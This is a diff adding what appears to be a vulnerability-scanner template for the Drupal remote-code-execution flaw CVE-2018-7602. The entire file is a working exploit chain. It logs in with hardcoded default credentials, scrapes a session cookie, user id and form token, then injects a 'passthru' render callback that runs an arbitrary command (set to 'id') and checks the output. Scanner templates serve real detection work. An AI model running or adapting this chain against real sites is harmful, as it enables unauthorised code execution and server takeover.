@@ -1,0 +1,108 @@
+id: drupal-cve-2018-7602
+
+info:
+  name: Drupal RCE (CVE-2018-7602)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Drupal 7.x and 8.x subsystems contain remote code execution vulnerabilities. Attackers can exploit this vulnerability to execute arbitrary code.
+  reference:
+    - https://www.exploit-db.com/exploits/44557/
+    - https://nvd.nist.gov/vuln/detail/CVE-2018-7602
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7602
+
+variables:
+  cmd: id
+
+http:
+  - id: login
+    method: POST
+    path:
+      - "/?q=user%2Flogin"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      form_id=user_login&name=admin&pass=123456&op=Log+in
+    extractors:
+      - type: regex
+        name: cookie_id
+        part: header
+        internal: true
+        regex:
+          - "Set-Cookie: (.*?);"
+
+  - id: fetch-user
+    method: GET
+    path:
+      - "/?q=user"
+    headers:
+      Cookie: '{{cookie_id}}'
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: user_id
+        part: body
+        internal: true
+        regex:
+          - "<meta about=\"(.*?)\" property=\"foaf:name\""
+
+  - id: cancel-request
+    method: GET
+    path:
+      - "/?q={{user_id}}/cancel"
+    headers:
+      Cookie: '{{cookie_id}}'
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: form_token
+        part: body
+        internal: true
+        regex:
+          - "name=\"form_token\" value=\"(.*?)\" />"
+
+  - id: execute-cmd
+    method: POST
+    path:
+      - "/?q={{user_id}}%2Fcancel&destination={{user_id}}%2Fcancel%3Fq%5B%%2523post_render%%5D%%5B%%5D%%3Dpassthru%%26q%%5B%%2523type%%5D%%3Dmarkup%%26q%%5B%%2523markup%%5D%%3D{{cmd}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: '{{cookie_id}}'
+    body: |
+      form_id=user_cancel_confirm_form&form_token={{form_token}}&_triggering_element_name=form_id&op=Cancel+account
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: form_build_id
+        part: body
+        internal: true
+        regex:
+          - "name=\"form_build_id\" value=\"(.*?)\" />"
+
+  - id: finalize-cmd
+    method: POST
+    path:
+      - "/?q=file%2Fajax%2Factions%2Fcancel%2F%23options%2Fpath%2F{{form_build_id}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: '{{cookie_id}}'
+    body: |
+      form_build_id={{form_build_id}}
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid"
+          - "gid"
